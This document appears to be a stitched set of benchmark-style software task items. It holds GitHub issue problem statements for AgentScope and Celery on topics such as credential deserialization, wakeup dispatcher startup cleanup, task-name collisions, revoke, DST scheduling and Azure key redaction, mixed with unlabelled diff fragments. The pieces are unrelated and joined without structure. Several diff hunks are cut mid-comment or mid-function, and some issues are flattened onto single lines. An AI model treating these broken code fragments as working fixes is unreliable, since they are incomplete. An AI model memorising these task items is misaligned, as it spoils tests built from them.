   Daily will retain its selected time of day, Weekly its selected weekday, Monthly its selected day of the month, and Once its selected month and day. All four frequencies will use `started_at` to exclude executions before the intended start time. Annual recurrence for Once will be handled separately.

5. **Add regression tests**  
   Cover request submission, persistence, retrieval, and execution boundaries for all four frequencies, ensuring that valid Cron matches exactly at either boundary are retained. Also cover differing browser and task time zones, omitted or null values, invalid timestamps, and invalid start/end ranges. Rejected requests must neither write to storage nor trigger scheduler change notifications.

For daylight saving time transitions during start-time conversion, I plan to reject nonexistent local times and choose the first occurrence of ambiguous local times—the one corresponding to the earlier UTC instant. Subsequent recurring executions will continue to follow the existing scheduler behavior.

problem_statement:
[Bug]: CredentialFactory does not register TypeSafeCredential, so stored records cannot be deserialized
### Prerequisites

- [x] I have searched the existing [issues](https://github.com/agentscope-ai/agentscope/issues) and [discussions](https://github.com/agentscope-ai/agentscope/discussions), and this is not a duplicate.
- [x] This is a bug, not a usage question. (For questions, please use [Discussions](https://github.com/agentscope-ai/agentscope/discussions/new?category=general) instead.)

### Background / Description

`TypeSafeCredential` is a first-class built-in: it is exported from `agentscope.credential.__all__`, its docstring documents the `type` discriminator, and `JevClassifierModel` requires it. But `CredentialFactory._classes` — which claims "Built-in credential types are pre-registered" — lists all ten other built-ins and omits it.

Consequences, all verified on main @ bdad647d:

- `CredentialFactory.from_dict(TypeSafeCredential(...).model_dump())` raises `ValidationError` (the tagged union knows only the ten registered classes) — stored credentials of this type can never be deserialized;
- `CredentialFactory.get_credential_class("typesafe_credential")` returns `None`;
- `list_schemas()` (used by the app `/credentials` router, which calls `from_dict` on every POST) omits the type.

### Steps to Reproduce

```python
from agentscope.credential import TypeSafeCredential, CredentialFactory

CredentialFactory.from_dict(TypeSafeCredential(api_key="ts-key").model_dump())
# ValidationError: 1 validation error for tagged-union[...]  (10 classes, no TypeSafe)
print(CredentialFactory.get_credential_class("typesafe_credential"))  # None
```

No API key or external service needed.

### Expected Behavior

Every exported built-in credential round-trips through the factory: `from_dict` restores the instance, `get_credential_class` resolves its discriminator and `list_schemas` includes it.

I have a small fix plus a regression test verified locally and would like to submit a PR for this issue.

-        self._fallback_task = asyncio.create_task(
-            self._fallback_loop(),
-            name="wakeup-dispatcher:fallback",
-        )
-        await self._bus.publish(MessageBusKeys.wakeup_signal(), {})
-        self._chat_queue.schedule_recovery()
+        try:
+            if self._task.done():
+                raise RuntimeError("Wakeup subscription ended during startup")
+            self._fallback_task = asyncio.create_task(
+                self._fallback_loop(),
+                name="wakeup-dispatcher:fallback",
+            )
+            await self._bus.publish(MessageBusKeys.wakeup_signal(), {})
+            if self._task.done():
+                raise RuntimeError("Wakeup subscription ended during startup")
+            self._chat_queue.schedule_recovery()
+        except BaseException:
+            # Failed entry does not invoke __aexit__. The listener and
+            # fallback may already have spawned retries or recovery work.
+            tasks = [
+                task
+                for task in (
+                    self._task,
+                    self._fallback_task,
+                    *self._retry_tasks,
+                )
+                if task is not None
+            ]
+            for task in tasks:
+                task.cancel()
+            await asyncio.gather(*tasks, return_exceptions=True)
+            self._task = None
+            self._fallback_task = None
+            self._retry_tasks.clear()

+            # the failed bus to release recovery leadership.
+            await self._chat_queue.close(release_leadership=False)
+            raise
         return self

problem_statement:
[Bug]: wakeup startup can succeed with a dead listener or leak tasks after readiness
### Prerequisites

- [x] I searched existing issues and PRs for these startup boundaries.
- [x] This is a bug, not a usage question.

### Background / Description

Two failures remain after the wakeup subscription signals readiness:

1. A subscription calls `on_ready()` and immediately returns. Startup can succeed even though the listener has already ended.
2. The initial `publish(wakeup_signal(), {})` raises or is cancelled. Entry fails, so the context manager never calls `__aexit__`, leaving the listener and fallback task running.

I reproduced both on main and on #3632 (`411c4f0`). #3632 addresses failure *before* readiness and explicitly leaves initial-publish cleanup out of scope. This issue covers only the remaining post-readiness startup boundary.

### Steps to Reproduce

Using the existing `_FakeBus` in `tests/service_wakeup_dispatcher_test.py`:

- Replace `subscribe` with an async generator that calls `on_ready()` and then returns. Await dispatcher entry: it incorrectly returns successfully.
- Keep the normal subscription and patch `publish` to raise `ConnectionError`. Await entry: the exception propagates, but `_task` and `_fallback_task` remain live.

The two regression cases fail against both main and #3632. No Redis or model call is required.

### Expected Behavior

Successful startup requires a live listener. Failed/cancelled entry should cancel and await locally started tasks, clear their handles, and preserve the original error. Cleanup should not require another operation on the failed bus.

I am preparing a focused follow-up PR with regression tests, retaining #3632's separate pre-readiness scope.

### Error Messages

Initial publish: `ConnectionError` reaches the caller, but dispatcher tasks remain pending. The dead-listener case has no error: startup reports success.

### Environment

- AgentScope: 2.0.12.dev0, main `4acacb9f`; also compared with #3632 at `411c4f0`
- Python: 3.11.11
- OS: macOS

problem_statement:
[Bug]: failed steering items are auto-executed by the chat queue pump
### Describe the bug

A steering input that the middleware rejects is left in the durable chat FIFO with `state="failed"` and a visible `error`, so the user can edit, delete, or steer it again. The queue pump does not check that state before claiming the FIFO head: it treats the failed item as an ordinary pending turn and executes it as soon as the session is free.

This means a message that was explicitly rejected for injection (for example, because it contains a tool-call/thinking block or empty content) is later sent to `ChatService.run()` unchanged, often before the user has a chance to fix it. If the failure was caused by unsupported content, the auto-run can fail the whole turn.

### To Reproduce

The following uses the real `ChatInputQueue` and `InMemoryMessageBus`; only storage and `ChatService.run` are stand-ins:

```python
import asyncio
from types import SimpleNamespace

from agentscope.app._bus_ops import enqueue_chat_input
from agentscope.app._manager._chat_input_queue import ChatInputQueue
from agentscope.app.message_bus import InMemoryMessageBus, MessageBusKeys
from agentscope.message import Msg, TextBlock
from agentscope.state import AgentState


class Storage:
    async def get_session(self, *args):
        return SimpleNamespace(state=AgentState())

    async def upsert_message(self, *args, **kwargs):
        pass


class ChatService:
    def __init__(self):
        self.calls = []

    async def run(self, **kwargs):
        self.calls.append(kwargs)


async def main():
    async with InMemoryMessageBus() as bus:
        service = ChatService()
        queue = ChatInputQueue(bus, Storage(), service)
        await enqueue_chat_input(
            bus, "alice", "session-1", "agent-1",
            Msg(name="alice", role="user", content=[TextBlock(text="hello")]),
        )

        entries = await bus.queue_read(
            MessageBusKeys.chat_inputs("session-1"), max_count=1,
        )
        entry = entries[0][1]
        entry["state"] = "failed"
        await bus.queue_replace(
            MessageBusKeys.chat_inputs("session-1"), [entry],
        )

        await queue.drain_chat_inputs("alice", "session-1", "agent-1")
        print("ChatService.run calls:", len(service.calls))


asyncio.run(main())
```

On main at `782bd43f` this prints `ChatService.run calls: 1`; the failed item is also removed from the queue.

A real failed item is produced by `fail_steering_chat_input()` when the steering middleware rejects the queued content, so this is not only a hand-edited queue state.

### Expected behavior

The queue pump should skip a FIFO head whose `state` is `failed`; the item should remain visible for the user to edit, delete, or steer, and should only run after an edit sets it back to `queued` (or a successful steering reservation consumes it). A failed item must not be silently promoted to an ordinary turn.

### Environment

- AgentScope version: main at `782bd43f`
- Python: 3.11
- OS: Windows
- No Redis server, model credentials, or external services are needed for the reproduction above.

problem_statement:
feat(webui): display background tool execution status in the side panel
**Background**

Some tools in AgentScope can run in the background (e.g., long-running tasks). Currently, there is no way for users to know whether any tools are running in the background for the current session, or which ones they are. Adding visibility into background tool execution would improve transparency and user experience.

**Changes**

- Frontend: after the right side panel is introduced in #1799, add a new section to it displaying the background tool execution status for the current session — including whether any tools are running and the details of each.

**Dependencies**
- #1799: right side panel support in the chat page
- #1720: backend API for listing background running tools

problem_statement:
Two callables sharing __name__ in one module collapse into one registered task, silently, and the two registration paths disagree about which survives
## Summary

A task's registered name is `f"{fun.__module__}.{fun.__name__}"` — `__qualname__` is never consulted. Two distinct callables that share `__name__` within one module therefore collapse into a single registered task, and a caller invoking the second one receives `SUCCESS` and the **first function's result**.

The two registration paths resolve the collision in **opposite directions**, and both are silent.

## Where

`celery/app/base.py`, `_task_from_fun`:

```python
name = name or self.gen_task_name(fun.__name__, fun.__module__)
...
if name not in self._tasks:
    ...
else:
    task = self._tasks[name]      # silently returns the other function's task
```

`celery/utils/imports.py`, `gen_task_name`:

```python
return '.'.join(p for p in (module_name, name) if p)
```

`celery/app/registry.py`, `TaskRegistry.register`: a plain `self[task.name] = task`, no membership check.

## Reproduction

```python
from celery import Celery
app = Celery('repro', broker='memory://', backend='cache+memory://')
app.conf.task_always_eager = True

def make_scaler(factor):
    @app.task
    def scale(x):
        return x * factor
    return scale

double = make_scaler(2)
triple = make_scaler(3)

r = triple.delay(10)
print(double.name, triple.name)       # repro.scale repro.scale
print(double is triple)               # False  -- two distinct proxy objects
print(r.status, r.get())              # SUCCESS 20   expected 30
```

Observed on Celery 5.6.2 (`e48dc8e`):

```
repro.scale repro.scale
False
SUCCESS 20        expected 30
warnings raised during registration: []
```

Not an artefact of eager mode — the same through a real worker over the memory broker:

```
registered names ending .scale: ['wp.scale']
worker path: result=20 (expected 30)
```

A second form, without closures — two classes in one module with same-named methods:

```
Alpha.handler.name = repro.handler
Beta.handler.name  = repro.handler
Beta.handler.delay(1) = 'alpha:1'    expected 'beta:1'
__qualname__ differs: Alpha.handler != Beta.handler
```

## The two paths disagree

```python
class T1(Task):
    name = 'dup'
    def run(self, x): return 'first'

class T2(Task):
    name = 'dup'
    def run(self, x): return 'second'

app.register_task(T1()); app.register_task(T2())
app.tasks['dup'].delay(0).get()      # 'second'
```

The decorator path keeps the **first**; `register_task` keeps the **last**. Which function actually runs under a colliding name depends on which API registered it. Neither announces anything.

## Negative controls

```
# A: explicit name= -> correct pairing
t3.delay(10) = 30    correct

# B: distinct __name__ -> correct pairing (near miss)
scale_b.delay(10) = 30    correct
```

Control B is the near miss: identical factory shape, only `__name__` differs, and it correctly does not trigger — so the failure is attributable to the name key, not to closures.

## The silence

- `warnings.simplefilter('always')` with `catch_warnings(record=True)` around both registrations: `[]`
- `logging.basicConfig(level=DEBUG)` over the whole run: 68 lines, none matching `duplic|collis|overwrit|already|conflict`
- exit code 0, `r.status == 'SUCCESS'`
- the returned proxy is a *distinct object* from the first task while dispatching to its body, so an identity check by the caller does not reveal it either

## What the docs say

`docs/userguide/tasks.rst`:

> Every task class has a unique name, and this name is referenced in messages
>
> **Every task must have a unique name.**
>
> A best practice is to use the module name as a name-space, this way names won't collide if there's already a task with that name defined in another module.

Uniqueness is stated as a requirement of the system. The remedy offered addresses collisions *across* modules; the within-module case cannot be fixed by module namespacing and is silently mis-paired.

## Note

`celery/exceptions.py` defines a public, exported, documented exception for exactly this condition:

```python
class AlreadyRegistered(Exception):
    """The task is already registered."""   # XXX Unused
```

It is never raised anywhere in the tree.

`_task_from_fun` also copies `fun.__qualname__` onto the task object about twenty lines after computing the name without it, so the disambiguating information is present at the point where it would be needed.

## Scope

The collision requires two same-named callables in one module. That arises in practice with task factories, decorated methods on multiple classes, and generated or plugin task modules — it is not exotic, but it is not the common case either.

I have not checked whether this has been discussed before; a pointer to an existing issue is welcome and I am happy to close this in favour of one.

## Version

Celery 5.6.2, source at `e48dc8e`, Python 3.12, `memory://` broker, `cache+memory://` backend.

problem_statement:
database backend does not store children
The [`Task`](https://github.com/celery/celery/blob/main/celery/backends/database/models.py#L20-L27) and [`TaskExtended`](https://github.com/celery/celery/blob/main/celery/backends/database/models.py#L57-L62) models for the `database` backend do not include `children`. This means that when using any `database` backend, [`AsyncResult.children`](https://github.com/celery/celery/blob/main/celery/result.py#L424) is always empty, even if a task does have children.

If you think about it, this is the only solution to this problem; you need a mechanism for notifying your consumers (workers) that certain messages should be ignored/discarded (unprocessed but acknowledged).

Possible improvements:
1. Clarify `revoke` documentation entries.
2. Recursively revoke all tasks in Canvas workflows.
> Clarify revoke documentation entries.

Quite necessary, yes.

> Recursively revoke all tasks in Canvas workflows.

Which assumes that canvas relationships are being persisted (see https://github.com/celery/celery/issues/4299), which doesn’t seem to be the case, which should at least be documented—better yet, fixed.

I have a rather similar but peculiar case, related with this issue. I have a chain of tasks that also include a chords. So a sample would be something like

```python
workflow = task1.s() | task2.s() | task3.s() | group(task4.s() for i in range(n)) | callback.s() | clean_up.s()
```
When a user executes a workflow I store the workflow as a tuple inside redis and when a user wants to revoke the workflow I recreate the Async result using `result_from_tuple` method like so:

```python
res = workflow.apply_async()
store_worfklow(res.as_tuple())
# later when user wants to revoke()
res = result_from_tuple(get_workflow_tuple(), app=celery_app)
res.revoke()
parent = res.parent
while parent is not None:
    parent.revoke()
    parent = parent.parent
```
I start celery worker with autoscale and fair profile:
```shell
celery -A my_app worker --autoscale=1,0 -Ofair -l info
```
If I have a worflow consuming all workers, and start and revoke another workflow, then I see the following behaviour:

- task1 is received (Main Process)
- task1 is discarded before executing as expected. 

But when I start worker with:
```shell
celery -A my_app worker --autoscale=4,2 -Ofair -l info
```
then 

- task1 is received (Main process)
- task1 is executed normally when picked by worker
- task2 is discarded.
I thought revoke should broadcast revoke to the worker and task is not executed either when received or when picked for execution. But this is not the case. 
I also encountered this problem while running celery on kubernetes with like 5 workers in our production environment. I was exploring the cause and stumbled upon a discrepancy among the list of revoked tasks of each worker. 

One of the workers had only 150 ish revoked tasks in total and all other nodes were at their max capacity of **50K**. It maybe a subtle bug in the `LimitedSet`, but I was consistently seeing workers revoking the task id (in logs) and then executing it later. 
I restarted the node that had 150 revoked tasks, it was synced with others and had 50K entries, but the problem still persisted. Although the `revoked` set for all nodes were at their max capacity, they weren't being purged.

It was very late and I resumed my debugging the next day and the problem disappeared. I was monitoring the revoked tasks list for each node, started some tasks and revoked them, they started with around 49900 ish total revokes, increased a bit and then they were purged to around 8000. 

Maybe this leads to a clue, but overall I am still lost.

[EDIT 10-11-2021]

I have noticed that this happens when I perform a rolling restart of the deployment. My conjecture is that the `monotonic` clock of the new worker gets reset, any new value you add to LimitedSet will have the timestamp lower than the oldest element in the set. And hence by default the new entry is already the oldest element. And if the set is already full, the new element get's popped off during purging. Coupled with the fact if the previous oldest item hasn't expired, the purging stops.
This is worth investigating.
Also, maybe the limit should be configurable.
Just wanted to make a note that may save people some time. The docs mention that revoke is only supported by redis and rabbitmq at this time. If you're using another broker then you likely won't get any errors, the task will just not revoke. I spent a ton of time trying to figure out what I was doing wrong until I realized sqlite simply wasn't supported as a broker (what I'm using) for remote control actions (which is what revoke uses).
Is there any way I can use `revoke` or something similar if I am using SQS as a message broker?
I've just made a simple test with 5.3.6 (emerald-rush). I've sent the same task that sleeps for 60m 10 times to a queue. Backend is Redis, and I made worker that spawns only two worker processes (-c 2). Then I wrote a tiny script that just calls app.control.revoke(<task id>) and I gave it ID of the tasks that I know are in the queue (listed all entries in Redis). Repeated this multiple times, verified that the task is still in the queue... Does this mean that we have no safe (read "supported") way to remove tasks from the queue? Mind you, these tasks are not running yet.

problem_statement:
forget() is not idempotent on azureblockblob and cosmosdb result backends
### Summary

`result.forget()` on a missing result should be a no-op on every KV result backend. PR #10697 made `forget()` idempotent for the Elasticsearch and CouchDB backends (matching the existing `DocumentNotFoundException` handling in `couchbase.py` and the no-op behavior of Redis, cache, DynamoDB, ArangoDB, and S3's non-raising `delete_object`). Two backends still let a missing-key error through:

- `celery/backends/azureblockblob.py`: `blob_client.delete_blob()` raises `azure.core.exceptions.ResourceNotFoundError` for a missing blob.
- `celery/backends/cosmosdbsql.py`: `DeleteDocument()` raises `azure.cosmos.exceptions.HTTPFailure` (or the legacy `HTTPFailure`) with status 404 for a missing document.

(`gcs.py` checks `blob.exists()` first, so it already behaves as a no-op.)

### Suggested fix

Catch the missing-key exception in each backend's `delete()` (mirroring #10697), so `forget()` behaves consistently across KV backends.

Found during review of #10697 — filing separately per the reviewer's suggestion.

### Other Dependencies

No running broker, result backend, or worker is required for the deterministic unit reproduction. The production-reachable path is most relevant to eventlet/gevent workers, where `gPidbox` receives remote-control commands in a separate greenlet while the hub-less synchronous loop drains deferred operations.

## Minimally Reproducible Test Case Run this test against the `main` checkout: ```console PYTHONPATH=. pytest -q test_pending_operation_order.py ```

```python from collections import deque from types import SimpleNamespace from celery.worker.consumer.consumer import Consumer from celery.worker.control import add_consumer, cancel_consumer def test_pending_consumer_operations_preserve_command_order(): consumer = SimpleNamespace( hub=None, _pending_operations=deque(), ) consumer.call_soon = Consumer.call_soon.__get__(consumer) consumer.perform_pending_operations = ( Consumer.perform_pending_operations.__get__(consumer) ) queue_state = { "enabled": False, "operations": [], } def add_task_queue(*args, **kwargs): queue_state["operations"].append("add") queue_state["enabled"] = True def cancel_task_queue(*args, **kwargs): queue_state["operations"].append("cancel") queue_state["enabled"] = False consumer.add_task_queue = add_task_queue consumer.cancel_task_queue = cancel_task_queue state = SimpleNamespace(consumer=consumer) add_consumer(state, "example") cancel_consumer(state, "example") assert len(consumer._pending_operations) == 2 consumer.perform_pending_operations() assert queue_state["operations"] == ["add", "cancel"] assert queue_state["enabled"] is False ```

# Expected Behavior Deferred operations should execute in the same order in which `call_soon()` scheduled them. If `add_consumer("example")` is followed by `cancel_consumer("example")` before the synchronous loop's next drain, the worker should execute `add` and then `cancel`. The queue should therefore end disabled, matching the final remote-control command. # Actual Behavior In hub-less mode, `Consumer.call_soon()` appends callbacks to `_pending_operations`, but `Consumer.perform_pending_operations()` removes callbacks with zero-argument `pop()`: ```python self._pending_operations.append(p) ... self._pending_operations.pop()() ``` This makes the buffer LIFO. The reproduction fails with: ```text E AssertionError: assert ['cancel', 'add'] == ['add', 'cancel'] ``` The final queue state is enabled: ```text operations = ['cancel', 'add'] enabled = True ``` This is reachable in eventlet/gevent workers because remote-control commands are received by `gPidbox` in a separate greenlet and can accumulate before the main synchronous loop calls `perform_pending_operations()`. Consequently, multiple deferred queue-control commands may take effect in the opposite order from their accepted command order. In particular, an accepted `add_consumer` followed by `cancel_consumer` can leave the queue enabled, contrary to the caller's final command. Suggessted fix in PR #10734

problem_statement:
Celery beat stops sending tasks on DST changes On the DST end that happened this weekend for Europe (the 2020-10-29, for CET/CEST or Europe/Paris), celery beat stopped sending tasks that should be running every minutes. Note: AFAIK, Europe _may_ stop DST change by 2021. so this bug may become irrelevant for Europe/CET/CEST. But other country may still encounter it. > On 26 March 2019, the European Parliament [...] [supports] a stop to the seasonal clock changes by 2021. -- https://ec.europa.eu/transport/themes/summertime_en # Checklist * [x] I have verified that the issue exists against the `master` branch of Celery. * [ ] This has already been asked to the [discussion group](https://groups.google.com/forum/#!forum/celery-users) first. * [x] I have read the relevant section in the [contribution guide](http://docs.celeryproject.org/en/latest/contributing.html#other-bugs) on reporting bugs. * [x] I have checked the [issues list](https://github.com/celery/celery/issues?q=is%3Aissue+label%3A%22Issue+Type%3A+Bug+Report%22+-label%3A%22Category%3A+Documentation%22) for similar or identical bug reports. * [x] I have checked the [pull requests list](https://github.com/celery/celery/pulls?q=is%3Apr+label%3A%22PR+Type%3A+Bugfix%22+-label%3A%22Category%3A+Documentation%22) for existing proposed fixes. * [x] I have checked the [commit log](https://github.com/celery/celery/commits/master) to find out if the bug was already fixed in the master branch. * [x] I have included all related issues and possible duplicate issues in this issue (If there are none, check this box anyway). ## Mandatory Debugging Information * [x] I have included the output of ``celery -A proj report`` in the issue. (if you are not able to do this, then at least specify the Celery version affected). * [x] I have verified that the issue exists against the `master` branch of Celery. * [x] I have included the contents of ``pip freeze`` in the issue. * [x] I have included all the versions of all the external dependencies required to reproduce this bug. ## Optional Debugging Information * [ ] I have tried reproducing the issue on more than one Python version and/or implementation. * [ ] I have tried reproducing the issue on more than one message broker and/or result backend. * [ ] I have tried reproducing the issue on more than one version of the message broker and/or result backend. * [ ] I have tried reproducing the issue on more than one operating system. * [ ] I have tried reproducing the issue on more than one workers pool. * [ ] I have tried reproducing the issue with autoscaling, retries, ETA/Countdown & rate limits disabled. * [ ] I have tried reproducing the issue after downgrading and/or upgrading Celery and its dependencies. ## Related Issues and Possible Duplicates #### Related Issues This is not the first time DST change cause some issue. Example: * https://github.com/celery/celery/pull/4403 #### Possible Duplicates * None ## Environment & Settings **Celery version**: 5.0.1 (singularity)

+    Intervals of a day or more advance by local calendar days before
+    rounding to midnight. For example, ``timedelta(days=1)`` becomes due
+    at the next midnight even when a DST change makes the day 23 or 25
+    hours long. If midnight falls in a DST gap, the deadline moves forward
+    by the change in UTC offset to an existing local time.

+    is used.

+    When an entry runs late, such as after a :program:`celery beat` restart,
+    the next check aligns to the next rounded clock boundary rather than
+    drifting from the actual execution time.

## Minimally Reproducible Test Case

```python from datetime import datetime, timedelta from zoneinfo import ZoneInfo from celery import Celery from celery.schedules import schedule app = Celery('dst_repro', broker='memory://', backend='cache+memory://') app.conf.timezone = 'America/New_York' last_run_at = datetime(2026, 11, 1, 0, 30, tzinfo=ZoneInfo('America/New_York')) s = schedule( timedelta(days=1), relative=True, nowfun=lambda: last_run_at, app=app, ) print('remaining:', s.remaining_estimate(last_run_at)) print('is_due:', s.is_due(last_run_at)) assert s.remaining_estimate(last_run_at) == timedelta(seconds=88200) assert s.is_due(last_run_at) == (False, 88200) ```

# Expected Behavior For `relative=True` and `timedelta(days=1)`, advance by one local calendar day and then round to midnight. A previous run at `2026-11-01 00:30 EDT` should have its next deadline at `2026-11-02 00:00 EST`. At `now == last_run_at`, the expected result is: ```text remaining: 1 day, 0:30:00 is_due: schedstate(is_due=False, next=88200.0) ``` The 88,200 seconds include the extra hour introduced by the DST rollback. # Actual Behavior On unchanged main, the test produces: ```text remaining: -1 day, 23:30:00 is_due: schedstate(is_due=True, next=86400.0) ``` The included assertion fails: ```text Traceback (most recent call last): File "repro.py", line 16, in assert s.remaining_estimate(last_run_at) == timedelta(seconds=88200) AssertionError ``` The calculation adds 86,400 elapsed seconds, reaching `2026-11-01 23:30 EST`, then `delta_resolution()` rounds that down to `2026-11-01 00:00 EDT`. This deadline is 1,800 seconds before `last_run_at`, so `schedule.is_due()` considers the task immediately due. Beat can dispatch additional runs on consecutive ticks before the deadline advances. Related cases also fail: two-day relative intervals across DST, daily relative intervals around spring-forward that round to the following date instead of the intended date, and hourly relative schedules during Lord Howe's half-hour rollback. Hourly schedules during a full repeated hour must retain elapsed-time arithmetic so both occurrences can execute. Suggested fix in PR #10818

+def _redact_azure_connection_string(connection_string, mask='**'):
+    """Redact sensitive credentials in Azure Storage connection strings.
+
+    Azure connection strings use semicolon-separated key=value pairs.
+    This function redacts known secret keys while preserving other fields.
+
+    Args:
+        connection_string: The Azure connection string to redact.
+        mask: The mask string to replace secrets with (default: '**').
+
+    Returns:
+        The redacted connection string with AccountKey and SharedAccessSignature
+        values replaced by the mask.
+    """
+    # Azure matches connection string keys case-insensitively
+    secret_keys = {'accountkey', 'sharedaccesssignature'}
+    redacted_parts = []
+    for part in connection_string.split(';'):
+        key, sep, value = part.partition('=')
+        if sep and key.strip().lower() in secret_keys:
+            # Redact the entire value of secret keys
+            part = f'{key}={mask}'
+        else:
+            # Redact sig parameters in endpoint URLs (case-insensitive)
+            # Pattern: (?|&)sig=VALUE, preserving the parameter name and separator
+            if value:
+                # Use case-insensitive regex to find and redact sig parameters
+                value = re.sub(r'([?&]sig=)[^&;#]*', r'\1' + mask, value, flags=re.IGNORECASE)
+                part = f'{key}={value}'
+        redacted_parts.append(part)
+
+    return ';'.join(redacted_parts)
+

# Steps to Reproduce ## Required Dependencies * **Minimal Python Version**: Python 3.13 * **Minimal Celery Version**: Current `main` * **Minimal Kombu Version**: Current version from `main` environment * **Minimal Broker Version**: Not relevant; reproduction uses the in-memory broker * **Minimal Result Backend Version**: Azure Blob Storage backend * **Minimal OS and/or Kernel Version**: Reproduced on Windows * **Minimal Broker Client Version**: Not relevant * **Minimal Result Backend Client Version**: Azure Storage Blob client ### Python Packages
pip freeze Output:

``` Please replace this with the output of `pip freeze` from the reproduction environment. ```

### Other Dependencies

Azure Blob Storage backend configuration is required. A live Azure account is not required to reproduce the redaction issue because the problem occurs while sanitizing the connection-string value.

## Minimally Reproducible Test Case

```python from celery import Celery from celery.app.utils import sanitize_url backend = ( "azureblockblob://" "DefaultEndpointsProtocol=https;" "AccountName=acct;" "AccountKey=SECRET==;" "EndpointSuffix=core.windows.net" ) print(sanitize_url(backend)) ``` The current implementation returns the connection string with `AccountKey=SECRET==` unchanged. The same value can reach Celery's diagnostic/configuration output through the bug-report path: ```text celery -A proj report ``` When an Azure Block Blob result backend is configured, the generated report can contain the storage account key in plaintext. A representative connection string is: ```text azureblockblob://DefaultEndpointsProtocol=https;AccountName=acct;AccountKey=SECRET==;EndpointSuffix=core.windows.net ``` No real credential should be used when reproducing or reporting this issue.

# Expected Behavior Sensitive credentials contained in Azure Block Blob connection strings should be redacted anywhere Celery sanitizes configuration values or generates diagnostic output. In particular, `celery report` should not expose values such as: ```text AccountKey=SECRET== ``` or: ```text SharedAccessSignature=... ``` The redaction behavior should be consistent with the existing redaction performed by `AzureBlockBlobBackend.as_uri()`. # Actual Behavior `sanitize_url()` does not redact credentials contained in Azure Blob Storage connection strings. The current sanitization logic handles credentials represented in the URL authority portion, such as: ```text redis://:password@host ``` However, Azure Block Blob credentials are embedded directly in the connection string: ```text azureblockblob://DefaultEndpointsProtocol=https;AccountName=acct;AccountKey=SECRET==;EndpointSuffix=core.windows.net ``` Because there is no `user:password@host` component, the Azure connection string passes through `sanitize_url()` without the `AccountKey` being redacted. This affects the configuration/diagnostic path used by `bugreport()` and therefore `celery report`. For example, the resulting report can contain: ```text result_backend: azureblockblob://DefaultEndpointsProtocol=https;AccountName=acct;AccountKey=SECRET==;EndpointSuffix=core.windows.net ``` The credential can therefore be exposed if a user copies the output of `celery report` into a public bug report. There is a related existing fix in #10620 where `AzureBlockBlobBackend.as_uri()` redacts Azure credentials. However, the configuration-level sanitization path does not use the same redaction logic, so the credentials can still be exposed through `celery report` and other paths based on `sanitize_url()`. The issue also applies to Azure connection strings containing `SharedAccessSignature`. A possible fix would be to share the Azure connection-string redaction logic between `sanitize_url()` and `AzureBlockBlobBackend.as_uri()` so that both paths consistently protect the same sensitive fields.

+def ids_in_as_tuple(tuple_repr):
+    """Return the id of every node in an as_tuple() tree."""
+    ids = []
+
+    def walk(tup):
+        if tup is None:
+            return
+        (res, nodes) = tup
+        (node_id, parent) = res
+        ids.append(node_id)
+        for child in nodes or ():
+            walk(child)
+        walk(parent)
+
+    walk(tuple_repr)
+    return ids

diff --git a/celery/backends/base.py b/celery/backends/base.py
index 1327c48216e..5b332588032 100644
--- a/celery/backends/base.py
+++ b/celery/backends/base.py
@@ -1155,11 +1155,27 @@ def __init__(self, *args, **kwargs):
         if hasattr(self.key_t, '__func__'):  # pragma: no cover
             self.key_t = self.key_t.__func__  # remove binding
         super().__init__(*args, **kwargs)
+        self._chord_expires = self.app.conf.get('result_chord_expires')
         self._add_global_keyprefix()
         self._encode_prefixes()
         if self.implements_incr:
             self.apply_chord = self._apply_chord_incr
 
+    @property
+    def chord_expires(self):
+        if self._chord_expires is None:
+            return self.expires
+        return self.prepare_expires(self._chord_expires, type=int)
+
+    @property

## Steps to reproduce
Run about 100 task header of a chord, with a callback. The chord is started through `.delay()`.
Usage is similar to what the docs have:
`chord((import_contact.s(c) for c in contacts), notify_complete.si(import_id)).apply_async()`. In my case, I do not use an immutable signature, and i pass many `kwargs` into the callback/body.


## Expected behavior
I expect that once my header has completed, that the callback will run.


## Actual behavior
Depending on how long the header tasks run for, the callback is not called. I'm still trying to figure out if it is a time or memory or other sort of issue. But, I wanted to get the issue created while I'm looking through it further.

It's also possible that it doesn't have to do with how long it takes at all. I'll try updating further.

My new leading hypothesis is that this is related to my project's use of `result_expires`. We used to have this set at 60 seconds, and now we have it at 10 seconds.

Tonight I decided to revisit this (we're using celery `4.2.0`). There are a few workflows that would benefit us from having this work _all_ of the time; we've been hesitant to utilize the `chord` because we were having issues with it running the body all the time.

Now, if we have, say, 1 task, and we have a header of 2 of them being called (say `add` each), and then let the body also be an `add`, if we lower the result expire to 1 second, and also include a `time.sleep(2)` in the `add` implementation, I've never seen the `body` task run.

Playing with the result expires and the "task time" (fake long task with a time.sleep) seems like the culprit.

There is documentation around result expires, however, if this is the issue for the `redis` backend, then the docs should warn against setting a low task expire results time, in the case of a `chord`.
